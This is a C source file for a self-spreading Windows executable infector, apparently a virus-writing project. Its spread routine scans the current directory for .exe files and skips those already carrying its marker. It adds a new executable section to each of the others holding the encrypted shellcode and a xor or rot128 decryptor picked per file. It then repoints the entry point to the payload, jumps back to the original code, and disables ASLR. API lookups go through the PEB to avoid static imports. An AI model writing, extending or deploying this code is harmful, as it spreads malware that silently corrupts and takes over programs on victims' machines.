#include <Windows.h>

#include "banner.h"
#include "ciphers.h"
#include "pebLookup.h"
#include "prototype.h"

#define MEM_ALIGN(operand, alignment) ((operand + (alignment - 1)) & ~(alignment - 1))

int jmpOffset = 0x13;
int passingParamsOpcodeSize = 30;

PIMAGE_SECTION_HEADER getShellcodeSection(LPVOID baseAddress) {
    PIMAGE_DOS_HEADER dosHeader = baseAddress;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((ULONG_PTR)baseAddress + dosHeader->e_lfanew);
    LPVOID sectionHeader = (LPVOID)((ULONG_PTR)ntHeaders + sizeof(IMAGE_NT_HEADERS));

    // NOTE: Add x86 support
    if (ntHeaders->FileHeader.Characteristics & IMAGE_FILE_32BIT_MACHINE) {
        return NULL;
    }

    PIMAGE_SECTION_HEADER textSection = NULL;
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i) {
        PIMAGE_SECTION_HEADER currentSection = (PIMAGE_SECTION_HEADER)((ULONG_PTR)sectionHeader + i * sizeof(IMAGE_SECTION_HEADER));
        DWORD64 name = *(PDWORD64)currentSection->Name;
        // .rsrc
        if (name == 0x637373722e) {
            return currentSection;
        }
        // .text
        if (name == 0x747865742e) {
            textSection = currentSection;
        }
    }

    return textSection;
}

int getFileAlignment(protoCreateFileMappingA _CreateFileMappingA, protoMapViewOfFile _MapViewOfFile, protoUnmapViewOfFile _UnmapViewOfFile,
                     protoCloseHandle _CloseHandle, HANDLE file) {
    HANDLE fileMapping = _CreateFileMappingA(file, NULL, PAGE_READONLY, 0, 0, NULL);
    LPVOID baseAddress = _MapViewOfFile(fileMapping, FILE_MAP_READ, 0, 0, 0);

    PIMAGE_DOS_HEADER dosHeader = baseAddress;
    PIMAGE_NT_HEADERS ntHeaders = baseAddress + dosHeader->e_lfanew;

    int fileAlignment = ntHeaders->OptionalHeader.FileAlignment;

    _UnmapViewOfFile(baseAddress);
    _CloseHandle(fileMapping);

    return fileAlignment;
}

BOOL isInfected(HANDLE kernel32, protoGetProcAddress _GetProcAddress, LPCSTR fileName) {
#pragma GCC diagnostic ignored "-Wcast-function-type"
    protoCloseHandle _CloseHandle = (protoCloseHandle)_GetProcAddress(kernel32, "CloseHandle");
    protoCreateFileA _CreateFileA = (protoCreateFileA)_GetProcAddress(kernel32, "CreateFileA");
    protoCreateFileMappingA _CreateFileMappingA = (protoCreateFileMappingA)_GetProcAddress(kernel32, "CreateFileMappingA");
    protoMapViewOfFile _MapViewOfFile = (protoMapViewOfFile)_GetProcAddress(kernel32, "MapViewOfFile");
    protoUnmapViewOfFile _UnmapViewOfFile = (protoUnmapViewOfFile)_GetProcAddress(kernel32, "UnmapViewOfFile");
#pragma GCC diagnostic pop

    HANDLE file = _CreateFileA(fileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    HANDLE fileMapping = _CreateFileMappingA(file, NULL, PAGE_READONLY, 0, 0, NULL);
    LPVOID baseAddress = _MapViewOfFile(fileMapping, FILE_MAP_READ | FILE_MAP_COPY, 0, 0, 0);
    PIMAGE_SECTION_HEADER shellcode = getShellcodeSection(baseAddress);

    BOOL result = TRUE;
    if (shellcode) {
        // .rssc
        result =
            *(PDWORD64)shellcode->Name == 0x637373722e || *(PDWORD)((ULONG_PTR)baseAddress + shellcode->PointerToRawData + jmpOffset) == 0xdeadbeef;
    }

    _UnmapViewOfFile(baseAddress);
    _CloseHandle(fileMapping);
    _CloseHandle(file);

    return result;
}

ULONG_PTR RVA2RA(LPVOID baseAddress, int RVA) {
    PIMAGE_DOS_HEADER dosHeader = baseAddress;
    PIMAGE_NT_HEADERS ntHeaders = baseAddress + dosHeader->e_lfanew;
    LPVOID sectionHeader = (LPVOID)(ULONG_PTR)ntHeaders + sizeof(IMAGE_NT_HEADERS);

    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i) {
        PIMAGE_SECTION_HEADER currentSection = (PIMAGE_SECTION_HEADER)((ULONG_PTR)sectionHeader + i * sizeof(IMAGE_SECTION_HEADER));

        int VA = currentSection->VirtualAddress;
        int VS = currentSection->Misc.VirtualSize;
        if (VA <= RVA && RVA <= VA + VS) {
            return (ULONG_PTR)baseAddress + RVA - VA + currentSection->PointerToRawData;
        }
    }

    return -1;
}

BOOL tlsInject(LPVOID baseAddress, ULONG_PTR callbackAddress) {
    PIMAGE_DOS_HEADER dosHeader = baseAddress;
    PIMAGE_NT_HEADERS ntHeaders = baseAddress + dosHeader->e_lfanew;

    PIMAGE_DATA_DIRECTORY dataDirectoryTLS = (PIMAGE_DATA_DIRECTORY)(&ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS]);
    if (!dataDirectoryTLS->VirtualAddress) {
        return FALSE;
    }

    PIMAGE_TLS_DIRECTORY tlsDirectory = (PIMAGE_TLS_DIRECTORY)RVA2RA(baseAddress, dataDirectoryTLS->VirtualAddress);
    PDWORD64 firstCallbackAddress = (PDWORD64)RVA2RA(baseAddress, tlsDirectory->AddressOfCallBacks - ntHeaders->OptionalHeader.ImageBase);

    while (*firstCallbackAddress) ++firstCallbackAddress;

    *firstCallbackAddress = callbackAddress;
    *(firstCallbackAddress + 1) = 0;

    // Turn off PIE
    ntHeaders->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;

    return TRUE;
}

int inject(HANDLE kernel32, protoLoadLibraryA _LoadLibraryA, protoGetProcAddress _GetProcAddress, LPCSTR fileName) {
    HANDLE ntdll = _LoadLibraryA("NtDll.dll");

#pragma GCC diagnostic ignored "-Wcast-function-type"
    protoRtlCopyMemory _RtlCopyMemory = (protoRtlCopyMemory)_GetProcAddress(ntdll, "RtlCopyMemory");

    protoCloseHandle _CloseHandle = (protoCloseHandle)_GetProcAddress(kernel32, "CloseHandle");
    protoCreateFileA _CreateFileA = (protoCreateFileA)_GetProcAddress(kernel32, "CreateFileA");
    protoCreateFileMappingA _CreateFileMappingA = (protoCreateFileMappingA)_GetProcAddress(kernel32, "CreateFileMappingA");
    protoGetFileSize _GetFileSize = (protoGetFileSize)_GetProcAddress(kernel32, "GetFileSize");
    protoGetModuleFileNameA _GetModuleFileNameA = (protoGetModuleFileNameA)_GetProcAddress(kernel32, "GetModuleFileNameA");
    protoMapViewOfFile _MapViewOfFile = (protoMapViewOfFile)_GetProcAddress(kernel32, "MapViewOfFile");
    protoUnmapViewOfFile _UnmapViewOfFile = (protoUnmapViewOfFile)_GetProcAddress(kernel32, "UnmapViewOfFile");
#pragma GCC diagnostic pop

    char baseFileName[MAX_PATH];
    _GetModuleFileNameA(NULL, baseFileName, MAX_PATH);
    HANDLE base = _CreateFileA(baseFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (base == INVALID_HANDLE_VALUE) {
        return 1;
    }

    // Using file mapping instead of ReadFile and WriteFile
    HANDLE baseMapping = _CreateFileMappingA(base, NULL, PAGE_READONLY, 0, 0, NULL);
    LPVOID baseAddress = _MapViewOfFile(baseMapping, FILE_MAP_READ | FILE_MAP_COPY, 0, 0, 0);

    PIMAGE_SECTION_HEADER shellcode = getShellcodeSection(baseAddress);

    // NOTE: Change to original shellcode size, otherwise it will grown up over time
    int shellcodeSize = shellcode->SizeOfRawData;

    HANDLE target = _CreateFileA(fileName, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (target == INVALID_HANDLE_VALUE) {
        return 2;
    }

    // Create new space for the shellcode
    int fileAlignment = getFileAlignment(_CreateFileMappingA, _MapViewOfFile, _UnmapViewOfFile, _CloseHandle, target);
    int targetFileSize = _GetFileSize(target, NULL);

    HANDLE targetMapping = _CreateFileMappingA(target, NULL, PAGE_READWRITE, 0,
                                               MEM_ALIGN(targetFileSize + shellcodeSize + passingParamsOpcodeSize + 100, fileAlignment), NULL);
    LPVOID targetAddress = _MapViewOfFile(targetMapping, FILE_MAP_ALL_ACCESS, 0, 0, 0);

    PIMAGE_DOS_HEADER dosHeader = targetAddress;
    PIMAGE_NT_HEADERS ntHeaders = targetAddress + dosHeader->e_lfanew;

    // Create new section
    LPVOID sectionHeader = (LPVOID)(ULONG_PTR)ntHeaders + sizeof(IMAGE_NT_HEADERS);
    PIMAGE_SECTION_HEADER newSection =
        (PIMAGE_SECTION_HEADER)((ULONG_PTR)sectionHeader + ntHeaders->FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER));
    PIMAGE_SECTION_HEADER lastSection = (PIMAGE_SECTION_HEADER)((ULONG_PTR)newSection - sizeof(IMAGE_SECTION_HEADER));

    ++ntHeaders->FileHeader.NumberOfSections;

    // .rssc
    *(PDWORD64)newSection->Name = 0x637373722e;

    // Calculate new section size
    int sectionAlignment = ntHeaders->OptionalHeader.SectionAlignment;

    newSection->SizeOfRawData = MEM_ALIGN(shellcodeSize, fileAlignment);
    newSection->Misc.VirtualSize = MEM_ALIGN(shellcodeSize, sectionAlignment);

    ntHeaders->OptionalHeader.SizeOfImage += newSection->Misc.VirtualSize;

    newSection->PointerToRawData = lastSection->PointerToRawData + lastSection->SizeOfRawData;
    newSection->VirtualAddress = MEM_ALIGN(lastSection->VirtualAddress + lastSection->Misc.VirtualSize, sectionAlignment);

    newSection->Characteristics = IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE;

    LPVOID targetDecryptorLocation = (LPVOID)((ULONG_PTR)targetAddress + newSection->PointerToRawData);

    // TODO: can copy opcode from there instead of char array
    void (*ciphers[])(char *, unsigned int, unsigned long long) = {&xorCipher, &rot128Cipher};

    char *ciphersOpcode[] = {xorCipherOpcode, rot128CipherOpcode};
    int ciphersSize[] = {xorCipherOpcodeSize, rot128CipherOpcodeSize};

    DWORD64 encryptionKey = (ULONG_PTR)targetDecryptorLocation + ~targetFileSize;

    int cipherId = encryptionKey & 1;

    // Passing params to decryptor
    *(PDWORD)((ULONG_PTR)targetDecryptorLocation) = 0xb948;  // mov rcx
    *(PDWORD64)((ULONG_PTR)targetDecryptorLocation + 2) = ciphersSize[cipherId];

    *(PDWORD)((ULONG_PTR)targetDecryptorLocation + 10) = 0xba48;  // mov rdx
    *(PDWORD64)((ULONG_PTR)targetDecryptorLocation + 12) = shellcodeSize;

    *(PDWORD)((ULONG_PTR)targetDecryptorLocation + 20) = 0xb849;  // mov r8
    *(PDWORD64)((ULONG_PTR)targetDecryptorLocation + 22) = encryptionKey;

    // Copy decryptor's body
    _RtlCopyMemory((LPVOID)((ULONG_PTR)targetDecryptorLocation + passingParamsOpcodeSize), ciphersOpcode[cipherId], ciphersSize[cipherId]);

    // Copy shellcode
    LPVOID targetEncryptedShellcodeLocation = targetDecryptorLocation + passingParamsOpcodeSize + ciphersSize[cipherId];

    // section name != .rssc which means the original injector, no need to decrypt
    if (*(PDWORD64)shellcode->Name != 0x637373722e) {
        LPVOID rawShellcode = baseAddress + shellcode->PointerToRawData;
        _RtlCopyMemory(targetEncryptedShellcodeLocation, rawShellcode, shellcodeSize);
    } else {
        LPVOID decryptorLocation = baseAddress + shellcode->PointerToRawData;
        DWORD64 decryptorSize = *(PDWORD64)((ULONG_PTR)decryptorLocation + 2) + passingParamsOpcodeSize;
        DWORD64 encryptedShellcodeSize = *(PDWORD64)((ULONG_PTR)decryptorLocation + 12);
        DWORD64 key = *(PDWORD64)((ULONG_PTR)decryptorLocation + 22);
        int cipherId = key & 1;

        LPVOID encryptedShellcodeLocation = decryptorLocation + decryptorSize;

        // copy encrypted shellcode to target
        _RtlCopyMemory(targetEncryptedShellcodeLocation, encryptedShellcodeLocation, encryptedShellcodeSize);

        // decrypt encrypted shellcode
        (*ciphers[cipherId])(targetEncryptedShellcodeLocation, encryptedShellcodeSize, key);

        shellcodeSize = encryptedShellcodeSize;
    }

    // patch jump relative back to target program's OEP
    *(PDWORD)(targetEncryptedShellcodeLocation + jmpOffset) =
        ntHeaders->OptionalHeader.AddressOfEntryPoint -
        (newSection->VirtualAddress + passingParamsOpcodeSize + ciphersSize[cipherId] + jmpOffset + 4);

    // encrypt shellcode
    (*ciphers[cipherId])(targetEncryptedShellcodeLocation, shellcodeSize, encryptionKey);

    // if (tlsInject(targetAddress, newSection->VirtualAddress + ntHeaders->OptionalHeader.ImageBase)) {
    // patch jmp to ret
    // *(PDWORD)(dest + jmpOffset - 1) = 0xc3;
    // } else {
    // Change OEP to shellcode
    ntHeaders->OptionalHeader.AddressOfEntryPoint = newSection->VirtualAddress;
    // }

    _UnmapViewOfFile(targetAddress);
    _CloseHandle(targetMapping);
    _CloseHandle(target);

    _UnmapViewOfFile(baseAddress);
    _CloseHandle(baseMapping);
    _CloseHandle(base);

    return 0;
}

void spread(HANDLE kernel32, protoLoadLibraryA _LoadLibraryA, protoGetProcAddress _GetProcAddress) {
#pragma GCC diagnostic ignored "-Wcast-function-type"
    protoFindFirstFileA _FindFirstFileA = (protoFindFirstFileA)_GetProcAddress(kernel32, "FindFirstFileA");
    protoFindNextFileA _FindNextFileA = (protoFindNextFileA)_GetProcAddress(kernel32, "FindNextFileA");
    protoFindClose _FindClose = (protoFindClose)_GetProcAddress(kernel32, "FindClose");
#pragma GCC diagnostic pop

    WIN32_FIND_DATA ffd;
    HANDLE hFind = _FindFirstFileA("*.exe", &ffd);

    if (hFind == INVALID_HANDLE_VALUE) {
        return;
    }

    do {
        if (!isInfected(kernel32, _GetProcAddress, ffd.cFileName)) {
            inject(kernel32, _LoadLibraryA, _GetProcAddress, ffd.cFileName);
        }
    } while (_FindNextFileA(hFind, &ffd));

    _FindClose(hFind);
}

int shellcode() {
    HANDLE kernel32 = getModuleByName(L"Kernel32.dll");
    LPVOID _LoadLibraryA = getFuncByName(kernel32, "LoadLibraryA");
    LPVOID _GetProcAddress = getFuncByName(kernel32, "GetProcAddress");

    banner(_LoadLibraryA, _GetProcAddress);
    spread(kernel32, _LoadLibraryA, _GetProcAddress);

    return 0;
}

// int main() { shellcode(); }
